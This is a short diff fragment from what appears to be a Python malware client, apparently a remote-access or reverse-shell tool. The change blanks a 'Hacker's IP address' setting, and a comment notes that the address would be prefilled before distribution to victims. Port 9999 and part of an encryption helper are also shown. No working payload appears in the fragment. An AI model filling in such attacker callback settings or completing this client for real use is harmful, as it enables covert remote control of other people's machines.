@@ -15,7 +15,7 @@ def modify(key):
    i << 24
  return encrypt
 
-host = '172.20.10.2' #Hacker's IP address as a string
+host = '' #Hacker's IP address as a string
 #this would be prefilled usually before distribution
 port = 9999
 
